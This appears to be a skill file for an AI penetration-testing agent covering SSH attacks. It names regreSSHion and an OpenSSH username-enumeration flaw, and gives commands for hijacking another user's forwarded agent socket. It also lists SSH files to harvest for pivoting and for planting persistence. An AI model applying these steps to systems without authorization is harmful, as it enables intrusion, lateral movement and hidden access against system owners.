---
name: svc-ssh
description: SSH version CVEs and post-auth tricks — regreSSHion, user enum, agent hijack. Use when SSH is open. Triggers - port 22, OpenSSH banner, regreSSHion CVE-2024-6387, CVE-2018-15473.
---

# SSH — Version CVEs & Tricks

## CVE-2024-6387 (regreSSHion)
OpenSSH 8.5–9.7 on glibc-based Linux. Race condition → unauthenticated RCE.
Public PoCs exist but are slow/unreliable — confirm version, note as high-value finding.

## CVE-2018-15473 (user enumeration)
OpenSSH <7.7. Timing-based username enumeration.
`ssh-audit TARGET` or Metasploit `auxiliary/scanner/ssh/ssh_enumusers`.
User list → password spray / AS-REP roast.

## SSH agent forwarding hijack
If another user has agent forwarding enabled:
`find /tmp -name "agent.*"` → `SSH_AUTH_SOCK=/tmp/agent.XXXX ssh other-target`

## Post-auth pivot intel
- `~/.ssh/config` — other hosts, jump hosts, proxy configs
- `~/.ssh/known_hosts` — every host this user connected to
- `~/.ssh/authorized_keys` — who else has access (persistence opportunity)

## Auth method check
`ssh -o PreferredAuthentications=none TARGET` reveals accepted methods.
If only `publickey` → password brute is impossible, don't waste time on hydra.
